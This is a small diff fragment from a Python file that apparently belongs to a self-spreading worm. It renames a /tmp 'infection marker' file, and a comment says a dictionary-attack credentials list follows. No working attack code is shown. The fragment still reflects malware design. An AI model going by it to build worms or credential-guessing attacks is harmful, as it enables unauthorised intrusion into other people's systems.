@@ -12,7 +12,7 @@ import shutil
 
 
 # File marking the presence of a worm in a system
-INFECTION_MARKER = "/tmp/infectionMarker_extorter_python.txt"
+INFECTION_MARKER = "/tmp/infectionMarker_extW_python.txt"
   
   
 # List of credentials for Dictionary Attack
